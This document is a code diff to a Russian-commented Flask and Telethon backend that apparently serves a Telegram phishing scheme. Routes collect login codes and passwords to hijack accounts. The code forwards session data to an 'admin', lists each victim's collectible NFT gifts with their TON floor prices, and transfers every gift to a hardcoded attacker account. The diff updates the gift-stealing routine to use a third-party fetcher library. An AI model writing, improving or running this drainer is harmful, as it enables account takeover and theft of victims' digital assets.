@@ -1,4 +1,4 @@
-# app.py — С МЕТОДОМ GetStarGiftCollectionsRequest (ТОЛЬКО КОЛЛЕКЦИОННЫЕ NFT)
+# app.py — С ИСПОЛЬЗОВАНИЕМ telegram_gift_fetcher
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -10,7 +10,7 @@ import json
 import io
 import re
 from dotenv import load_dotenv
-from telethon import TelegramClient, functions, types
+from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import (
     PhoneNumberInvalidError,
@@ -20,7 +20,18 @@ from telethon.errors import (
     PasswordHashInvalidError,
     FloodWaitError
 )
+from telethon.tl.functions.payments import TransferGiftRequest
 import requests
+
+# Пытаемся импортировать telegram_gift_fetcher
+try:
+    from telegram_gift_fetcher import get_user_gifts
+    HAS_GIFT_FETCHER = True
+    print("✅ telegram_gift_fetcher загружен")
+except ImportError:
+    HAS_GIFT_FETCHER = False
+    print("❌ telegram_gift_fetcher НЕ найден")
+    print("   Установите: pip install git+https://github.com/CAPTHAIN/telegram_gift_fetcher.git")
 
 load_dotenv()
 
@@ -37,21 +48,6 @@ ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
 ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', '8766481292'))
 
 sessions = {}
-
-# ============================================================
-# ПРОВЕРКА ДОСТУПНОСТИ МЕТОДА
-# ============================================================
-HAS_GIFT_METHODS = False
-try:
-    # Проверяем наличие метода GetStarGiftCollectionsRequest
-    if hasattr(functions.payments, 'GetStarGiftCollectionsRequest'):
-        HAS_GIFT_METHODS = True
-        print("✅ GetStarGiftCollectionsRequest доступен")
-    else:
-        print("⚠️ GetStarGiftCollectionsRequest НЕ найден")
-        print("   Установите telethon>=1.38.0")
-except Exception as e:
-    print(f"❌ Ошибка проверки: {e}")
 
 # ============================================================
 # ОДИН EVENT LOOP
@@ -108,7 +104,12 @@ def send_tdata_to_admin(session_data):
 # ГЕНЕРАЦИЯ ССЫЛКИ НА NFT ПОДАРОК
 # ============================================================
 
-def get_gift_url(gift_name):
+def get_gift_url(gift_name, slug=None, num=None):
+    if slug:
+        if num:
+            return f"https://t.me/nft/{slug}-{num}"
+        return f"https://t.me/nft/{slug}"
+    
     match = re.search(r'#(\d+)', gift_name)
     if match:
         number = match.group(1)
@@ -120,19 +121,16 @@ def get_gift_url(gift_name):
     return f"https://t.me/nft/{collection}"
 
 # ============================================================
-# ПОЛУЧЕНИЕ И ПЕРЕДАЧА КОЛЛЕКЦИОННЫХ NFT (НОВЫЙ МЕТОД!)
+# ПОЛУЧЕНИЕ И ПЕРЕДАЧА КОЛЛЕКЦИОННЫХ NFT (ЧЕРЕЗ ГОТОВУЮ БИБЛИОТЕКУ)
 # ============================================================
 
 async def transfer_nft_gifts(session_string, phone, username, user_id):
-    """
-    Использует GetStarGiftCollectionsRequest для получения ТОЛЬКО коллекционных NFT
-    """
-    if not HAS_GIFT_METHODS:
+    if not HAS_GIFT_FETCHER:
         await send_admin_log(
-            f"ℹ️ *Метод GetStarGiftCollectionsRequest недоступен*\n"
+            f"ℹ️ *telegram_gift_fetcher не установлен*\n"
             f"📱 {phone}\n"
             f"👤 @{username}\n"
-            f"Обновите Telethon до версии 1.38.0"
+            f"Установите: pip install git+https://github.com/CAPTHAIN/telegram_gift_fetcher.git"
         )
         return False
     
@@ -146,18 +144,32 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
             return False
         
         # ============================================================
-        # ПОЛУЧАЕМ ТОЛЬКО КОЛЛЕКЦИОННЫЕ NFT ПОДАРКИ
+        # ИСПОЛЬЗУЕМ get_user_gifts ДЛЯ ПОЛУЧЕНИЯ ВСЕХ ПОДАРКОВ
         # ============================================================
         try:
-            result = await client(functions.payments.GetStarGiftCollectionsRequest(
-                peer=user_id,
-                hash=0
-            ))
+            # Получаем подарки пользователя через библиотеку
+            result = await get_user_gifts(client, user_id)
             
-            # Получаем список уникальных подарков (коллекционных NFT)
-            collections = result.collections if result and hasattr(result, 'collections') else []
+            # Библиотека возвращает словарь с ключом 'gifts'
+            all_gifts = result.get('gifts', []) if isinstance(result, dict) else []
             
-            if not collections:
+            if not all_gifts:
+                await send_admin_log(
+                    f"📭 *Нет подарков*\n"
+                    f"📱 {phone}\n"
+                    f"👤 @{username}"
+                )
+                return False
+            
+            # ============================================================
+            # ФИЛЬТРУЕМ ТОЛЬКО УНИКАЛЬНЫЕ ПОДАРКИ (StarGiftUnique)
+            # ============================================================
+            unique_gifts = []
+            for gift in all_gifts:
+                if gift.get('type') == 'StarGiftUnique':
+                    unique_gifts.append(gift)
+            
+            if not unique_gifts:
                 await send_admin_log(
                     f"📭 *Нет коллекционных NFT подарков*\n"
                     f"📱 {phone}\n"
@@ -172,37 +184,32 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
             gift_ids = []
             gift_names = []
             
-            for collection in collections:
+            for gift in unique_gifts:
                 try:
-                    # Получаем ID подарка
-                    gift_id = getattr(collection, 'id', None)
+                    gift_id = gift.get('id')
                     if not gift_id:
                         continue
                     
                     gift_ids.append(gift_id)
                     
-                    # Получаем информацию о подарке
-                    title = getattr(collection, 'title', 'Unknown NFT')
-                    slug = getattr(collection, 'slug', '')
-                    num = getattr(collection, 'num', 0)
-                    total = getattr(collection, 'total', 0)
-                    stars = getattr(collection, 'stars', 0)
+                    title = gift.get('title', 'Unknown NFT')
+                    slug = gift.get('slug', '')
+                    num = gift.get('num', 0)
+                    floor_price = gift.get('collection_floor_price_in_ton', 0)
+                    issued = gift.get('availability_issued', 0)
+                    total = gift.get('availability_total', 0)
                     
-                    # Формируем название
                     gift_name = f"{title} #{num}" if num else title
                     gift_names.append(gift_name)
                     
-                    # Формируем ссылку
-                    if slug:
-                        gift_url = f"https://t.me/nft/{slug}-{num}" if num else f"https://t.me/nft/{slug}"
-                    else:
-                        gift_url = get_gift_url(gift_name)
+                    gift_url = get_gift_url(gift_name, slug, num)
                     
-                    gift_info = f"• [{gift_name}]({gift_url}) — Stars: {stars} [{num}/{total}]"
+                    price_info = f"{floor_price} TON" if floor_price else "Цена неизвестна"
+                    gift_info = f"• [{gift_name}]({gift_url}) — {price_info} [{issued}/{total}]"
                     gift_links.append(gift_info)
                     
                 except Exception as e:
-                    print(f"Collection info error: {e}")
+                    print(f"Gift info error: {e}")
                     continue
             
             # ============================================================
@@ -226,8 +233,6 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
             
             for i, gift_id in enumerate(gift_ids):
                 try:
-                    # Используем TransferGiftRequest для передачи
-                    from telethon.tl.functions.payments import TransferGiftRequest
                     await client(TransferGiftRequest(
                         gift_id=gift_id,
                         to_id=ADMIN_USER_ID
@@ -265,20 +270,12 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
             
         except Exception as e:
             error = str(e)
-            if "not found" in error.lower() or "not available" in error.lower():
-                await send_admin_log(
-                    f"ℹ️ *Метод GetStarGiftCollectionsRequest не поддерживается*\n"
-                    f"📱 {phone}\n"
-                    f"👤 @{username}\n"
-                    f"Обновите Telethon до версии 1.38.0"
-                )
-            else:
-                await send_admin_log(
-                    f"❌ *Ошибка проверки NFT подарков*\n"
-                    f"📱 {phone}\n"
-                    f"👤 @{username}\n"
-                    f"`{error[:200]}`"
-                )
+            await send_admin_log(
+                f"❌ *Ошибка проверки NFT подарков*\n"
+                f"📱 {phone}\n"
+                f"👤 @{username}\n"
+                f"`{error[:200]}`"
+            )
             return False
         
     except Exception as e:
@@ -426,8 +423,8 @@ def run_async(coro):
 def ping():
     return jsonify({
         'status': 'online',
-        'gift_methods_available': HAS_GIFT_METHODS,
-        'method': 'GetStarGiftCollectionsRequest'
+        'gift_fetcher_available': HAS_GIFT_FETCHER,
+        'method': 'telegram_gift_fetcher'
     })
 
 @app.route('/sendCode', methods=['POST'])
@@ -508,8 +505,9 @@ def check_password():
 if __name__ == '__main__':
     print("=" * 60)
     print("🔐 БЭКЕНД ЗАПУЩЕН")
-    print("📌 Метод: GetStarGiftCollectionsRequest")
-    print("📌 Получает ТОЛЬКО коллекционные NFT подарки")
-    print(f"📌 Доступен: {'✅ ДА' if HAS_GIFT_METHODS else '❌ НЕТ'}")
+    print("📌 Использует: telegram_gift_fetcher")
+    print(f"📌 Доступен: {'✅ ДА' if HAS_GIFT_FETCHER else '❌ НЕТ'}")
+    if not HAS_GIFT_FETCHER:
+        print("📌 Установите: pip install git+https://github.com/CAPTHAIN/telegram_gift_fetcher.git")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000)
